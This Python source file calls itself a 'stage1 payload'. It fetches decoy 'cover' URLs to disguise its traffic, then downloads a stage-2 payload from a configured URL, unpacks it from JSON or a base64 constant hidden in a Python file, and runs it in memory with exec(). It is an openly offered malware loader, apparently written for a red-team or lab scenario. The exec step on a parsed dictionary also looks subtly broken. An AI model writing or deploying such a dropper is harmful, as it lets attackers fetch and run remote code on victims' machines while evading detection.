'''
 # @ Create Time: 2025-08-13 16:00:05
 # @ Modified time: 2025-08-13 16:01:24
 # @ Description: stage1 payload and execute as a conditional process, wait for certain time to download stage 2 payload
'''


from __future__ import annotations
import json, os, time, signal, base64, random
from pathlib import Path
from typing import Any, Dict, List
from urllib.request import Request, urlopen
from urllib.error import URLError, HTTPError
import ast

LOG_DIR = Path("logs"); LOG_DIR.mkdir(parents=True, exist_ok=True)
AUDIT = LOG_DIR / "stage1_payload.jsonl"  # JSON Lines

# ---------------- Env ----------------
# Comma-separated allow list covering both "cover" URLs and the real Stage-2 URL
ALLOWED_URLS = [u.strip() for u in os.getenv("SC6_ALLOWED_URLS", "").split(",") if u.strip()]
COVER_URLS   = [u.strip() for u in os.getenv("SC6_COVER_URLS", "").split(",") if u.strip()]
STAGE2_URL   = os.getenv("SC6_STAGE2_URL", "")
# If true, we pass the parsed Stage-2 doc to stage2_payload.run_from_doc; else stage1 interprets a tiny DSL directly
HANDOFF_TO_STAGE2 = os.getenv("SC6_HANDOFF_TO_STAGE2", "1") == "1"


def audit(event: str, **fields: Any) -> None:
    rec = {"ts": int(time.time()), "event": event}
    rec.update(fields)
    with AUDIT.open("a", encoding="utf-8") as f:
        f.write(json.dumps(rec, ensure_ascii=False) + "\n")

def fetch_url(url: str, max_bytes: int = 1 << 20) -> bytes:
    req = Request(url, headers={"User-Agent": "sc6-stage1-randwait/1.0"})
    with urlopen(req, timeout=15) as resp:
        body = resp.read(max_bytes + 1)
    if len(body)   > max_bytes:
        raise ValueError(f"Response too large: {len(body)} bytes")
    return body

def parse_stage2_doc(raw: bytes, src_hint: str = "") -> Dict[str, Any]:
    '''
    try json first, if that fails, treat as a Python container
        option A (markers)
            # sc6_payload_begin
            {... json ...}
            # sc6_payload_end
        option B (constant)
            sc6_payload_b64 = "eyJhY3Rpb25zIjpbXX0="
    '''
    text = None
    # 1) try plain JSON
    try:
        return json.loads(raw.decode("utf-8"))
    except Exception as e:
        text = raw.decode("utf-8", errors="replace")
    
    # 2) Constant string via AST
    try:
        tree = ast.parse(text, filename = (src_hint or "stage2.py"), mode="exec")   
        const_json: str | None = None
        const_b64: str | None = None
        for node in ast.walk(tree):
            if isinstance(node, ast.Assign):
                # support single-target assignments
                for tgt in node.targets:
                    if isinstance(tgt, ast.Name) and isinstance(node.value, ast.Constant) and isinstance(node.value.value, str):
                        if tgt.id == "SC6_PAYLOAD_JSON":
                            const_json = node.value.value
                        elif tgt.id == "SC6_PAYLOAD_B64":
                            const_b64 = node.value.value
    
        if const_json:
            doc = json.loads(const_json)
            audit("stage2_py_container_extracted", method="const_json")
            return doc
        if const_b64:
            import base64 as _b64
            inner = _b64.b64decode(const_b64)
            doc = json.loads(inner.decode("utf-8"))
            audit("stage2_py_container_extracted", method="const_b64")
            return doc
    except Exception as e:
        audit("stage2_py_container_ast_error", error=str(e))
    raise ValueError("stage_parse_failed")


def main() -> int:
    # 1) Cover traffic
    for u in COVER_URLS:
        try:
            audit("cover_fetch_attempt", url=u)
            _ = fetch_url(u)
            audit("cover_fetch_success", url=u)
        except Exception as e:
            audit("cover_fetch_error", url=u, error=str(e))
    
    if not STAGE2_URL:
        audit("stage2_missing_url"); return 1
    
    # 2) Fetch stage-2
    try:
        audit("stage2_fetch_attempt", url=STAGE2_URL)
        raw = fetch_url(STAGE2_URL)
        audit("stage2_fetch_success", url=STAGE2_URL, size=len(raw))
    except (HTTPError, URLError, ValueError) as e:
        audit("stage2_fetch_error", url=STAGE2_URL, error=str(e)); return 2
    
    # 3) Parse: JSON or .py container
    try:
        doc = parse_stage2_doc(raw, src_hint=STAGE2_URL)
    except Exception as e:
        audit("stage2_parse_error", url=STAGE2_URL, error=str(e)); return 3
    
    # 4) execute in memory
    try:
        exec(doc)
        audit("stage2_exec_success", url=STAGE2_URL)
    except Exception as e:
        audit("stage2_exec_error", url=STAGE2_URL, error=str(e)); return 4




